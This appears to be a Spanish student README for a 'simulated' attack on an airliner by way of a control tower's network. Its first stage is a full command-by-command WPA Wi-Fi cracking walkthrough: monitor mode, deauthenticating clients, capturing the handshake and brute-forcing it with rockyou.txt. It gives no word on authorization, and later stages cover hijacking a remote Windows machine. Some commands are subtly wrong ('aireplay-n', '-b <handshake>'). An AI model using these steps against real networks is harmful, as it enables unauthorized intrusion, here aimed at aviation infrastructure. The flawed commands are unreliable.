# Simulación de ciberataque a un avión comercial

El ataque consta de 3 etapas:
1. Acceso a la red Wi-Fi de la torre de control mediante fuerza bruta
2. A través de la conexión a la red Wi-Fi, detectar alguna máquina con control remoto activado y acceder a ella
3. Utilizando la máquina anteriormente secuestrada, alterar señales del avión

## Etapa 1: Acceso a la red Wi-Fi de la Torre de Control
En un computador con sistema operativo Linux (puede ser cualquier distribución: Ubuntu, Kali, etc.) descargar el diccionario de contraseñas `rockyou.txt`. Este se puede descargar en el primer enlace que se obtiene al buscar "rockyou descargar" en Google, correspondiente a un link de GitHub.

> [!IMPORTANT]
> Dado que para esta etapa necesitamos una interfaz de red, debemos realizar este procedimiento desde una máquina Linux, es decir, no es posible realizarlo desde una Virtual Machine. En caso de contar únicamente con una computadora Windows, se recomienda instalar Linux en Dual Boot.

Luego, en la terminal de la misma computadora ejecutar los siguientes comandos:
```
cd Descargas/
mv rockyou.txt ../Escritorio/
cd ../Escritorio/
```

> [!NOTE]
> Si el computador está configurado en inglés, debe reemplazar "Descargas" por "Downloads" y "Escritorio" por "Desktop"

```
mkdir wifi_pentest
mv rockyou.txt wifi_pentest/
cd wifi_pentest/
```

Con esto, habremos:
1. Descargado el diccionario de contraseñas `rockyou.txt`
2. Situado dicho diccionario en una carpeta llamada `wifi_pentest` en el Escritorio del computador

Ahora, ejecutamos el siguiente comando para descargar el paquete que nos ayudará a realizar el ataque de fuerza bruta
```
sudo apt install aircrack-ng
```

Una vez instalado, buscamos el nombre de la interfaz de red de la computadora ejecutando el siguiente comando
```
iwconfig
```

Anotamos el nombre de nuestra interfaz de red, el cual seguiremos utilizando a lo largo de todo el proceso.
```
sudo airmon-ng start <nombre_interfaz>
```

Con esto habremos activado el monitor de nuestra interfaz de red. Notarás que, si estabas conectado a Wi-Fi, se desconectará y no te permitirá activar el Wi-Fi.
```
sudo airodump-ng <nombre_interfaz>mon
```

Con esto, se mostrarán las redes Wi-Fi que nuestra computadora detecta. Buscamos la fila en la que aparece nuestra red Wi-Fi objetivo y copiamos el número que tiene en la columna BSSID. Además, memoriazamos el canal, el cual está en la columna "CH".

> [!TIP]
> En caso de que tu computadora detecte muchas redes, probablemente tu red objetivo no estará en pantalla mucho tiempo. Para ello, se recomienda grabar la pantalla para poder poner pausa al video y poder encontrar los datos que necesitamos de nuestra red objetivo.

```
sudo airodump-ng -c <CH> --bssid <BSSID> -w pentest <nombre>mon
```

El nombre `pentest` puede ser otro, aquí se guardará el tráfico de nuestra red objetivo.

Ahora, esperamos a que un dispositivo utilice la red y copiamos el valor de la columna STATION.

Dejamos ese código corriendo y, en otra pestaña de la terminal, escribimos:

```
sudo aireplay-n -0 9 -a <BSSID> -c <STATION> <nombre_interfaz>mon
```

Ejecutamos ese código 3-4 veces aproximadamente hasta que, en la primera pestaña de la terminal, aparezca un valor al lado de "WPA handshake" y presionamos `CTRL+C` para salir de esta ejecución.

Con el siguiente comando vemos los archivos que se han generado en la carpeta `Escritorio/wifi_pentest/`
```
ls
```

De estos archivos, nos interesa el archivo llamado `pentest-01.cap`.

Ahora, ejecutamos el siguiente código:

```
sudo aircrack-ng -b <handshake> -w rockyou.txt pentest-01.cap
```

Con esto, comienza el ataque por fuerza bruta. Trascurridos varios minutos (alrededor de 30), en un caso exitoso, en la terminal se mostrará la contraseña de nuestra red objetivo. Ahora solo falta activar nuestra interfaz Wi-Fi:
```
sudo airmon-ng stop <nombre_interfaz>mon
```

## Etapa 2: Detectar una máquina de la torre de control y acceder a ella mediante control remoto

Esta etapa debe realizarse desde una máquina Kali Linux.

> [!IMPORTANT]
> La máquina objetivo (es decir, la computadora a secuestrar) debe tener sistema operativo Windows y debe tener activada la opción de control remoto.

> [!NOTE]
> Una vez generado el acceso remoto a la computadora, la pantalla de esta en la torre de control se pondrá en negro, lo que podría dar pistas de que está ocurriendo un ciberataque.

## Etapa 3: Utilizando la máquina secuestrada, alterar las funciones del avión

Se presentan tres alternativas:
* Escribir un software que simule los subsistemas del avión utilizando Dockers y comunicándolos entre sí mediante RabbitMQ. Utilizando herramientas de Pentesting, analizar y explotar las vulnerabilidades de este sistema.
* Hacer un montaje de un ataque, escribiendo un programa simple en Python que reciba un input y, a partir de este, muestre videos emulando un ataque.
* Escribir un software más simple que la primera opción, el cual simule la comunicación entre el avión y la torre de control. Con el ataque a la computadora, desactivar la comunicación.

